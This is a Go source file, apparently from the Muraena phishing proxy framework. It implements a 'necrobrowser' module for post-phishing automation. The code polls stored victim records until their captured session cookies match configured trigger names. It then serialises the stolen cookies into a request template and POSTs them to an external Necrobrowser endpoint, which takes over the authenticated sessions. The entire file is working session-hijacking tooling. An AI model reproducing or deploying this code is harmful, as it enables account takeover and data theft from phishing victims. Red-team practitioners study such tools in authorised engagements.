package necrobrowser

import (
	"encoding/json"
	"io/ioutil"
	"strings"
	"time"

	"github.com/muraenateam/muraena/log"

	"gopkg.in/resty.v1"

	"github.com/muraenateam/muraena/core/db"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "necrobrowser"

	// Description of this module
	Description = "Post-phishing automation via Necrobrowser-NG"

	// Author of this module
	Author = "Muraena Team"

	// Placeholders for templates
	CookiePlaceholder      = "%%%COOKIES%%%"
	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
)

// Necrobrowser module
type Necrobrowser struct {
	session.SessionModule

	Enabled  bool
	Endpoint string
	Profile  string

	Request string
}

// Cookies
type SessionCookie struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Domain   string `json:"domain"`
	Expires  int64  `json:"expirationDate"`
	Path     string `json:"path"`
	HTTPOnly bool   `json:"httpOnly"`
	Secure   bool   `json:"secure"`
	Session  bool   `json:"session"`
}

// VictimCredentials structure
type VictimCredentials struct {
	Key   string
	Value string
	Time  time.Time
}

// Name returns the module name
func (module *Necrobrowser) Name() string {
	return Name
}

// Description returns the module description
func (module *Necrobrowser) Description() string {
	return Description
}

// Author returns the module author
func (module *Necrobrowser) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Necrobrowser) Prompt() {
	module.Raw("No options are available for this module")
}

// Load configures the module by initializing its main structure and variables
func Load(s *session.Session) (m *Necrobrowser, err error) {

	m = &Necrobrowser{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.NecroBrowser.Enabled,
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.NecroBrowser
	m.Endpoint = config.Endpoint

	m.Profile = config.Profile
	bytes, err := ioutil.ReadFile(m.Profile)
	if err != nil {
		m.Warning("Error reading profile file %s: %s", m.Profile, err)
		m.Enabled = false
		return
	}

	m.Request = string(bytes)

	// spawn a go routine that checks all the victims cookie jars every N seconds
	// to see if we have any sessions ready to be instrumented
	if s.Config.NecroBrowser.Enabled {
		go m.CheckSessions()
	}

	return
}

func (module *Necrobrowser) CheckSessions() {

	triggerType := module.Session.Config.NecroBrowser.Trigger.Type
	triggerDelay := module.Session.Config.NecroBrowser.Trigger.Delay

	for {
		switch triggerType {
		case "cookies":
			module.CheckSessionCookies()
		case "path":
			// TODO
			log.Warning("currently unsupported. TODO implement path")
		default:
			log.Warning("unsupported trigger type: %s", triggerType)
		}

		time.Sleep(time.Duration(triggerDelay) * time.Second)
	}
}

func (module *Necrobrowser) CheckSessionCookies() {
	triggerValues := module.Session.Config.NecroBrowser.Trigger.Values

	victims, err := db.GetAllVictims()
	if err != nil {
		module.Debug("error fetching all victims: %s", err)
	}

	// module.Debug("checkSessions: we have %d victim sessions. Checking authenticated ones.. ", len(victims))

	for _, v := range victims {
		cookiesFound := 0
		cookiesNeeded := len(triggerValues)
		for _, cookie := range v.Cookies {
			if Contains(&triggerValues, cookie.Name) {
				cookiesFound++
			}
		}

		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
			module.Instrument(v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
			// prevent the session to be instrumented twice
			_ = db.SetSessionAsInstrumented(v.ID)
		}
	}
}

func Contains(slice *[]string, find string) bool {
	for _, a := range *slice {
		if a == find {
			return true
		}
	}
	return false
}

func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {

	var necroCookies []SessionCookie
	const timeLayout = "2006-01-02 15:04:05 -0700 MST"

	for _, c := range cookieJar {

		module.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
		t, err := time.Parse(timeLayout, c.Expires)
		if err != nil {
			module.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
			continue
		}

		nc := SessionCookie{
			Name:     c.Name,
			Value:    c.Value,
			Domain:   c.Domain,
			Expires:  t.Unix(),
			Path:     c.Path,
			HTTPOnly: c.HTTPOnly,
			Secure:   c.Secure,
			Session:  t.Unix() < 1,
		}

		necroCookies = append(necroCookies, nc)
	}

	c, err := json.MarshalIndent(necroCookies, "", "\t")
	if err != nil {
		module.Warning("Error marshalling the cookies: %s", err)
		return
	}

	cookiesJSON := string(c)
	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)

	module.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)

	client := resty.New()
	resp, err := client.R().
		SetHeader("Content-Type", "application/json").
		SetBody(module.Request).
		Post(module.Endpoint)

	if err != nil {
		return
	}

	module.Info("NecroBrowser Response: %+v", resp)
	return
}
